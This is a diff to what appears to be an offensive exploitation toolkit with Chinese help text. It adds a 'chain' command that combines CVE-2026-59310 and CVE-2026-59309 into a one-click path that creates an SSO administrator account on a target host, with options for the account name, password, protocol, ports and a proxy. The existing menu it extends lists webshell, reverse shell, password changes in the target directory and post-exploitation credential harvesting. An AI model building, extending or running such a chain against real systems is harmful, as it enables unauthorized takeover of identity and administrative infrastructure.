@@ -12,6 +12,7 @@
   check59309    CVE-2026-59309 SRP 机制探测（--bypass 执行完整绕过）
   ldap59309     SSO 目录操作（枚举/建管/改密/查询）
   postex        后渗透（信息/凭据/IOC 快扫/自定义命令）
+  chain         一键打通：59310/59309 联动交付 SSO 管理员
   selftest      自检
   gui           图形界面
 """
@@ -129,6 +130,21 @@ def build_parser():
     s.add_argument("--wait", type=int, default=240)
     s.add_argument("--proxy", default=None)
     _proto_args(s)
+
+    s = sub.add_parser("chain", help="一键打通：59310/59309 联动交付 SSO 管理员")
+    s.add_argument("host")
+    s.add_argument("--user", default=None, help="交付账户名（默认自动生成）")
+    s.add_argument("--pass", dest="password", default=None,
+                   help="交付账户密码（默认自动生成强密码）")
+    s.add_argument("--skip-59310", dest="use_59310", action="store_false",
+                   help="跳过 59310 机器账户路径")
+    s.add_argument("--skip-59309", dest="use_59309", action="store_false",
+                   help="跳过 59309 SRP 路径")
+    s.add_argument("--proto", choices=["udp", "tcp", "tls"], default="udp")
+    s.add_argument("--port", type=int, default=514)
+    s.add_argument("--vami-port", type=int, default=5480)
+    s.add_argument("--wait", type=int, default=200)
+    s.add_argument("--proxy", default=None)
     return p
 
 
@@ -376,6 +392,16 @@ def cmd_ldap59309(a):
         conn.close()
 
 
+def cmd_chain(a):
+    from .chain import run_chain
+    r = run_chain(a.host, user=a.user, password=a.password,
+                  use_59310=a.use_59310, use_59309=a.use_59309,
+                  syslog_port=a.port, proto=a.proto, vami_port=a.vami_port,
+                  proxy=a.proxy, rce_wait=a.wait, log=print)
+    print("\n" + r.card)
+    return 0 if r.ok else 1
+
+
 def cmd_postex(a):
     if a.action == "cmd":
         if not a.cmdline:
@@ -437,7 +463,8 @@ def _dispatch(a):
           "write59310": cmd_write59310, "exec59310": cmd_exec59310,
           "webshell": cmd_webshell, "revshell": cmd_revshell,
           "listen": cmd_listen, "check59309": cmd_check59309,
-          "ldap59309": cmd_ldap59309, "postex": cmd_postex}[a.cmd]
+          "ldap59309": cmd_ldap59309, "postex": cmd_postex,
+          "chain": cmd_chain}[a.cmd]
     try:
         return fn(a)
     except (ConnectionError, OSError, ValueError, ssl.SSLError) as e:
